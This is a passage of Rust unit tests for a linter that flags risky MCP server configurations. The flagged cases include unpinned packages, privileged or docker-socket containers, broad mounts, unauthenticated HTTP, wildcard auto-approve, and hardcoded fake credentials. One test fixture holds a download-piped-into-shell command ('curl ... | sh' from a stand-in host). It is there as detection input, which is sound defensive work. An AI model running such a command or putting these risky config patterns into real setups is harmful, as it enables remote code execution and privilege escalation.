        if ch.is_ascii_alphanumeric() || ch == '_' || ch == '-' {
            run.push(ch);
        } else {
            found = found || is_high_entropy(&run);
            run.clear();
        }
    }
    found || is_high_entropy(&run)
}

fn is_high_entropy(run: &str) -> bool {
    run.len() >= 24
        && run.chars().any(|c| c.is_ascii_digit())
        && run.chars().any(|c| c.is_ascii_alphabetic())
}

#[cfg(test)]
#[expect(
    clippy::unwrap_used,
    reason = "a failed assumption in a test should fail the test"
)]
mod tests {
    use super::*;

    #[test]
    fn check_006_flags_download_piped_into_a_shell() {
        let entry = server(
            r#"{"command": "sh", "args": ["-c", "curl -fsSL https://x.example/i.sh | sh"]}"#,
        );
        let findings = check_shell_wrapper(
            "boot",
            &entry,
            Path::new("mcp.json"),
            "curl -fsSL https://x.example/i.sh | sh",
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "BAS-MCP-006");
        assert_eq!(findings[0].kind, Kind::Defect);
    }

    #[test]
    fn check_006_reports_nothing_for_a_plain_wrapper() {
        let entry = server(r#"{"command": "sh", "args": ["-c", "exec node server.js"]}"#);
        let findings = check_shell_wrapper("w", &entry, Path::new("mcp.json"), "{}");
        assert_eq!(findings.len(), 0);
    }

    #[test]
    fn a_registry_launcher_inside_a_wrapper_gets_the_pin_and_root_checks() {
        let entry = server(r#"{"command": "bash", "args": ["-c", "npx -y @scope/server /"]}"#);
        let findings =
            check_shell_wrapper("w", &entry, Path::new("mcp.json"), "npx -y @scope/server /");
        let mut ids: Vec<&str> = findings.iter().map(|f| f.rule_id.as_str()).collect();
        ids.sort_unstable();
        assert_eq!(ids, ["BAS-MCP-001", "BAS-MCP-005"]);
    }

    #[test]
    fn a_pinned_registry_launcher_inside_a_wrapper_is_quiet() {
        let entry = server(
            r#"{"command": "bash", "args": ["-c", "npx -y @scope/server@1.2.3 /srv/data"]}"#,
        );
        let findings = check_shell_wrapper("w", &entry, Path::new("mcp.json"), "{}");
        assert_eq!(findings.len(), 0);
    }

    #[test]
    fn a_non_launcher_inner_command_with_a_root_argument_is_quiet() {
        let entry = server(r#"{"command": "sh", "args": ["-c", "ls /"]}"#);
        let findings = check_shell_wrapper("w", &entry, Path::new("mcp.json"), "{}");
        assert_eq!(findings.len(), 0);
    }

    fn server(json: &str) -> ServerEntry {
        serde_json::from_str(json).unwrap()
    }

    fn docker(args: &str) -> ServerEntry {
        server(&format!(r#"{{"command": "docker", "args": {args}}}"#))
    }

    fn ids(findings: &[Finding]) -> Vec<&str> {
        findings.iter().map(|f| f.rule_id.as_str()).collect()
    }

    #[test]
    fn an_entry_is_found_by_its_json_yaml_or_toml_key() {
        let json = "{\n  \"mcpServers\": {\n    \"a\": {\"command\": \"docker\"},\n    \"docker\": {}\n  }\n}";
        let at = entry_start(json, "docker").unwrap();
        assert_eq!(json[..at].matches('\n').count(), 3);
        let yaml = "mcpServers:\n  a:\n    command: docker\n  docker:\n    args: []\n";
        let at = entry_start(yaml, "docker").unwrap();
        assert_eq!(yaml[..at].matches('\n').count(), 3);
        let toml = "[mcp_servers.a]\ncommand = \"docker\"\n[mcp_servers.docker]\nargs = []\n";
        let at = entry_start(toml, "docker").unwrap();
        assert_eq!(toml[..at].matches('\n').count(), 2);
        assert!(entry_start("{}", "docker").is_none());
    }

    #[test]
    fn check_007_flags_privileged_and_the_docker_socket() {
        let privileged = docker(r#"["run", "--rm", "-i", "--privileged", "img@sha256:1"]"#);
        assert_eq!(
            ids(&check_docker_launch(
                "d",
                &privileged,
                Path::new("mcp.json"),
                "--privileged"
            )),
            ["BAS-MCP-007"]
        );
        let sock =
            docker(r#"["run", "-v", "/var/run/docker.sock:/var/run/docker.sock", "img@sha256:1"]"#);
        assert_eq!(
            ids(&check_docker_launch(
                "d",
                &sock,
                Path::new("mcp.json"),
                "docker.sock"
            )),
            ["BAS-MCP-007"]
        );
        let sock_mount = docker(
            r#"["run", "--mount", "type=bind,src=/var/run/docker.sock,dst=/s", "img@sha256:1"]"#,
        );
        assert_eq!(
            ids(&check_docker_launch(
                "d",
                &sock_mount,
                Path::new("mcp.json"),
                "docker.sock"
            )),
            ["BAS-MCP-007"]
        );
    }

    #[test]
    fn check_001_extension_flags_a_root_or_home_bind_mount() {
        for args in [
            r#"["run", "-v", "/:/host", "img@sha256:1"]"#,
            r#"["run", "--volume=/home/alice:/h", "img@sha256:1"]"#,
            r#"["run", "--mount", "type=bind,source=$HOME,target=/h", "img@sha256:1"]"#,
        ] {
            let findings = check_docker_launch("d", &docker(args), Path::new("mcp.json"), "{}");
            assert_eq!(ids(&findings), ["BAS-MCP-001"], "{args}");
        }
    }

    #[test]
    fn check_008_flags_host_network_as_an_observation() {
        for args in [
            r#"["run", "--network", "host", "img@sha256:1"]"#,
            r#"["run", "--net=host", "img@sha256:1"]"#,
        ] {
            let findings =
                check_docker_launch("d", &docker(args), Path::new("mcp.json"), "--network");
            assert_eq!(ids(&findings), ["BAS-MCP-008"], "{args}");
            assert_eq!(findings[0].kind, Kind::Observation);
        }
    }

    #[test]
    fn docker_near_misses_are_quiet() {
        for args in [
            r#"["run", "--rm", "-i", "-v", "/srv/data:/data", "img@sha256:1"]"#,
            r#"["run", "--network=bridge", "img@sha256:1"]"#,
            r#"["run", "--privileged=false", "img@sha256:1"]"#,
            r#"["ps"]"#,
        ] {
            assert!(
                check_docker_launch("d", &docker(args), Path::new("mcp.json"), "{}").is_empty(),
                "{args}"
            );
        }
    }

    #[test]
    fn docker_inside_a_shell_wrapper_is_still_seen() {
        let entry = server(
            r#"{"command": "sh", "args": ["-c", "docker run --rm -i --privileged img@sha256:1"]}"#,
        );
        assert_eq!(
            ids(&check_docker_launch(
                "d",
                &entry,
                Path::new("mcp.json"),
                "--privileged"
            )),
            ["BAS-MCP-007"]
        );
    }

    #[test]
    fn root_arg_is_broad_but_narrow_path_is_not() {
        assert!(is_broad_filesystem_path("/"));
        assert!(is_broad_filesystem_path("~"));
        assert!(is_broad_filesystem_path("$HOME/secrets"));
        assert!(is_broad_filesystem_path("/home/alice"));
        assert!(is_broad_filesystem_path("/Users/alice"));
        assert!(!is_broad_filesystem_path("/srv/app/data"));
        assert!(!is_broad_filesystem_path("/home/alice/data"));
    }

    #[test]
    fn check_001_flags_root_not_narrow_path() {
        let entry = server(r#"{"command": "npx", "args": ["-y", "server", "/"]}"#);
        let findings = check_broad_filesystem_access(
            "fs",
            &entry,
            Path::new("mcp.json"),
            r#"{"args": ["-y", "server", "/"]}"#,
        );
        assert!(findings.is_some());
        assert_eq!(findings.unwrap().rule_id, "BAS-MCP-001");

        let narrow = server(r#"{"command": "npx", "args": ["/srv/app/data"]}"#);
        assert!(
            check_broad_filesystem_access("fs", &narrow, Path::new("mcp.json"), "{}").is_none()
        );
    }

    #[test]
    fn check_002_flags_plaintext_http_without_auth() {
        let entry = server(r#"{"url": "http://internal.example.com/mcp", "headers": {}}"#);
        let finding = check_unauthenticated_http(
            "remote",
            &entry,
            Path::new("mcp.json"),
            r#"{"url": "http://internal.example.com/mcp"}"#,
        )
        .unwrap();
        assert_eq!(finding.rule_id, "BAS-MCP-002");
        assert_eq!(finding.kind, Kind::Defect);
    }

    #[test]
    fn check_002_allows_http_with_auth_header() {
        let entry = server(
            r#"{"url": "http://internal.example.com/mcp", "headers": {"Authorization": "Bearer x"}}"#,
        );
        assert!(
            check_unauthenticated_http("remote", &entry, Path::new("mcp.json"), "{}").is_none()
        );
    }

    #[test]
    fn check_002_is_not_suppressed_by_a_credential_in_env() {
        // Found by the cobaia, not by a unit test. A server reachable over
        // plaintext HTTP with a hardcoded credential in `env` is vulnerable
        // twice over; consulting `env` for transport auth meant the credential
        // hid the missing-auth finding.
        let entry = server(
            r#"{"url": "http://internal.example.com/mcp", "env": {"DESKPILOT_API_KEY": "sk-live-9f2b7d41c6a8"}}"#,
        );

        let findings = check_unauthenticated_http("ops", &entry, Path::new("mcp.json"), "{}");

        assert!(
            findings.iter().any(|f| f.rule_id == "BAS-MCP-002"),
            "a credential in env is not transport authentication: {findings:#?}"
        );
    }

    #[test]
    fn check_002_treats_localhost_as_observation() {
        let entry = server(r#"{"url": "http://localhost:3000/mcp"}"#);
        let finding =
            check_unauthenticated_http("local", &entry, Path::new("mcp.json"), "{}").unwrap();
        assert_eq!(finding.rule_id, "BAS-MCP-002");
        assert_eq!(finding.kind, Kind::Observation);
        assert_eq!(finding.severity, Severity::Low);
    }

    #[test]
    fn check_003_flags_bare_and_array_wildcard() {
        let bare = server(r#"{"tools": "*"}"#);
        assert!(check_wildcard_tool_grant("s", &bare, Path::new("mcp.json"), "{}").is_some());

        let in_array = server(r#"{"permissions": ["read", "*"]}"#);
        assert!(check_wildcard_tool_grant("s", &in_array, Path::new("mcp.json"), "{}").is_some());

        let scoped = server(r#"{"allowedTools": ["read", "write"]}"#);
        assert!(check_wildcard_tool_grant("s", &scoped, Path::new("mcp.json"), "{}").is_none());
    }

    #[test]
    fn check_004_flags_real_secret_not_placeholders() {
        let entry = server(r#"{"env": {"API_TOKEN": "sk-live-abc123def456ghi789jkl"}}"#);
        let findings = check_hardcoded_credentials("s", &entry, Path::new("mcp.json"), "{}");
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "BAS-MCP-004");

        for placeholder in [
            "${API_TOKEN}",
            "<your-key>",
            "changeme",
            "xxx",
            "TODO",
            "example",
            "",
        ] {
            let entry = server(&format!(r#"{{"env": {{"API_TOKEN": "{placeholder}"}}}}"#));
            let findings = check_hardcoded_credentials("s", &entry, Path::new("mcp.json"), "{}");
            assert!(
                findings.is_empty(),
                "placeholder {placeholder:?} was flagged"
            );
        }
    }

    #[test]
    fn check_004_flags_a_real_secret_under_a_plural_key() {
        let entry = server(r#"{"env": {"API_KEYS": "sk-live-9f2b7d41c6a8e35019bd"}}"#);
        let findings = check_hardcoded_credentials("s", &entry, Path::new("mcp.json"), "{}");
        assert!(
            !findings.is_empty(),
            "a real credential under a plural key name must not be missed"
        );
    }

    #[test]
    fn check_004_stays_quiet_on_a_secret_sounding_key_with_a_boring_value() {
        let entry = server(r#"{"env": {"MAX_TOKENS": "1500", "approx_keys": "3"}}"#);
        let findings = check_hardcoded_credentials("s", &entry, Path::new("mcp.json"), "{}");
        assert!(
            findings.is_empty(),
            "the value gate, not the key gate, is what keeps these quiet"
        );
    }

    #[test]
    fn check_005_flags_an_unpinned_registry_launch() {
        let entry = server(
            r#"{"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/srv/data"]}"#,
        );
        let findings = check_unpinned_server("fs", &entry, Path::new("mcp.json"), "{}");
        assert!(
            findings.iter().any(|f| f.rule_id == "BAS-MCP-005"),
            "{findings:#?}"
        );
    }

    #[test]
    fn check_005_accepts_a_pinned_scoped_package() {
        // `@scope/name@version` — the leading `@` is part of the name, not a
        // version separator, which is the whole subtlety of this check.
        let entry = server(
            r#"{"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem@2026.7.10", "/srv/data"]}"#,
        );
        let findings = check_unpinned_server("fs", &entry, Path::new("mcp.json"), "{}");
        assert!(
            findings.is_empty(),
            "a pinned package must not be flagged: {findings:#?}"
        );
    }

    #[test]
    fn check_005_ignores_a_local_interpreter() {
        // `python -m server` resolves nothing from a registry, so there is no
        // supply-chain surface for a pin to protect.
        let entry = server(r#"{"command": "python", "args": ["-m", "our_own_server"]}"#);
        let findings = check_unpinned_server("local", &entry, Path::new("mcp.json"), "{}");
        assert!(findings.is_empty(), "{findings:#?}");
    }

    #[test]
    fn check_005_skips_flags_when_finding_the_package() {
        // `-y` carries no version information and must not be mistaken for the
        // package specifier.
        let entry = server(r#"{"command": "uvx", "args": ["--quiet", "runbook-server@1.0.0"]}"#);
        let findings = check_unpinned_server("rb", &entry, Path::new("mcp.json"), "{}");
        assert!(findings.is_empty(), "{findings:#?}");
    }

    #[test]
    fn check_004_does_not_flag_approx_tokens() {
        let entry = server(r#"{"env": {"approx_tokens": "12000"}}"#);
        let findings = check_hardcoded_credentials("s", &entry, Path::new("mcp.json"), "{}");
        assert!(findings.is_empty(), "approx_tokens was wrongly flagged");
    }

    #[test]
    fn key_words_splits_on_case_and_separators() {
        assert_eq!(key_words("API_TOKEN"), vec!["api", "token"]);
        assert_eq!(key_words("apiKey"), vec!["api", "key"]);
        assert_eq!(key_words("approx_tokens"), vec!["approx", "tokens"]);
    }

    #[test]
    fn check_020_flags_a_boolean_auto_approve() {
        let entry = server(r#"{"autoApprove": true}"#);
        let finding =
            check_auto_approve_wildcard("s", &entry, Path::new("mcp.json"), "{}").unwrap();
        assert_eq!(finding.rule_id, "BAS-LLM03-020");
        assert_eq!(finding.kind, Kind::Observation);
    }

    #[test]
    fn check_020_flags_a_wildcard_entry_in_either_field_name() {
        let auto_approve = server(r#"{"autoApprove": ["read_file", "*"]}"#);
        assert!(
            check_auto_approve_wildcard("s", &auto_approve, Path::new("mcp.json"), "{}").is_some()
        );

        let always_allow = server(r#"{"alwaysAllow": ["*"]}"#);
        assert!(
            check_auto_approve_wildcard("s", &always_allow, Path::new("mcp.json"), "{}").is_some()
        );
    }

    #[test]
    fn check_020_does_not_flag_a_named_tool_allowlist() {
        // The nuance the catalogue calls out explicitly: a narrower, named
        // allowlist is the correct, safer use of this same field and must
        // not be conflated with a wildcard.
        let entry = server(r#"{"autoApprove": ["read_file", "list_directory"]}"#);
        assert!(check_auto_approve_wildcard("s", &entry, Path::new("mcp.json"), "{}").is_none());
    }

    #[test]
    fn check_020_does_not_flag_false_or_an_empty_list_or_absence() {
        assert!(
            check_auto_approve_wildcard(
                "s",
                &server(r#"{"autoApprove": false}"#),
                Path::new("mcp.json"),
                "{}"
            )
            .is_none()
        );
        assert!(
            check_auto_approve_wildcard(
                "s",
                &server(r#"{"autoApprove": []}"#),
                Path::new("mcp.json"),
                "{}"
            )
            .is_none()
        );
        assert!(
            check_auto_approve_wildcard("s", &server("{}"), Path::new("mcp.json"), "{}").is_none()
        );
    }

    #[test]
    fn check_020_flags_a_client_wide_auto_approve_setting() {
        // The catalogue's own example is written at the top level, applying
        // to every server the config declares — not scoped to one server.
        let config: McpConfig =
            serde_json::from_str(r#"{"autoApprove": true, "mcpServers": {}}"#).unwrap();
        let findings = check_global_auto_approve_wildcard(
            &config,
            Path::new("mcp.json"),
            r#"{"autoApprove": true}"#,
        );
        assert_eq!(findings.len(), 1, "{findings:#?}");
        assert_eq!(findings[0].rule_id, "BAS-LLM03-020");
    }

    #[test]
    fn check_009_flags_a_literal_secret_in_a_query_parameter() {
        let json = r#"{"url": "https://m.example.com/mcp?api_key=sk-live-abc123def456ghi789jkl"}"#;
        let entry = server(json);
        let finding = check_secret_in_url("m", &entry, Path::new("mcp.json"), json).unwrap();
        assert_eq!(finding.rule_id, "BAS-MCP-009");
        assert_eq!(finding.kind, Kind::Defect);
        assert!(
            !finding.description.contains("sk-live"),
            "must not echo the secret"
        );
        assert!(finding.description.contains("api_key"));
    }

    #[test]
    fn check_009_walks_past_placeholders_and_ordinary_parameters() {
        for url in [
            "https://m.example.com/mcp?api_key=${METRICS_API_KEY}",
            "https://m.example.com/mcp?token=YOUR_TOKEN",
            "https://m.example.com/mcp?region=eu-west-1&page=2",
            "https://m.example.com/mcp",
        ] {
            let entry = server(&format!(r#"{{"url": "{url}"}}"#));
            assert!(
                check_secret_in_url("m", &entry, Path::new("mcp.json"), "{}").is_none(),
                "{url}"
            );
        }
    }

    #[test]
    fn check_009_ignores_a_stdio_entry() {
        // A stdio entry has no wire URL; an argument that looks like one is not this finding.
        let entry = server(r#"{"command": "node", "args": ["s.js"], "env": {}}"#);
        assert!(check_secret_in_url("m", &entry, Path::new("mcp.json"), "{}").is_none());
    }

    #[test]
    fn locate_entry_finds_a_pretty_printed_json_key() {
        let contents = "{\n  \"mcpServers\": {\n    \"a\": {\"url\": \"https://x\"}\n  }\n}\n";
        let (line, column, snippet) = locate_entry(contents, "a");
        assert_eq!((line, column), (3, 5));
        assert_eq!(snippet, "\"a\": {\"url\": \"https://x\"}");
    }

    #[test]
    fn locate_entry_separates_two_servers_on_one_minified_line() {
        let contents = r#"{"mcpServers":{"a":{"url":"https://a"},"b":{"url":"https://b"}}}"#;
        let (line_a, column_a, _) = locate_entry(contents, "a");
        let (line_b, column_b, _) = locate_entry(contents, "b");
        assert_eq!((line_a, line_b), (1, 1));
        assert!(column_a > 1 && column_b > column_a, "{column_a} {column_b}");
    }

    #[test]
    fn locate_entry_finds_yaml_and_toml_entries() {
        let yaml = "servers:\n  remote:\n    url: https://x\n";
        assert_eq!(locate_entry(yaml, "remote").0, 2);
        assert_eq!(locate_entry(yaml, "remote").1, 3);
        let toml = "[mcp_servers.remote]\nurl = \"https://x\"\n";
        let (line, column, snippet) = locate_entry(toml, "remote");
        assert_eq!((line, column), (1, 1));
        assert_eq!(snippet, "[mcp_servers.remote]");
    }

    #[test]
    fn locate_entry_prefers_the_real_key_over_a_substring_of_another() {
        let contents = "{\n  \"mcpServers\": {\n    \"mcp\": {\"url\": \"https://x\"}\n  }\n}\n";
        let (line, column, _) = locate_entry(contents, "mcp");
        assert_eq!((line, column), (3, 5));
    }

    #[test]
    fn locate_entry_falls_back_to_the_first_match_or_the_first_line() {
        let contents = "{\n  \"mcpServers\": {}\n}\n";
        assert_eq!(locate_entry(contents, "mcp").0, 2);
        assert_eq!(locate_entry(contents, "mcp").1, 1);
        assert_eq!(locate_entry(contents, "absent"), (1, 1, "{".to_string()));
    }
}
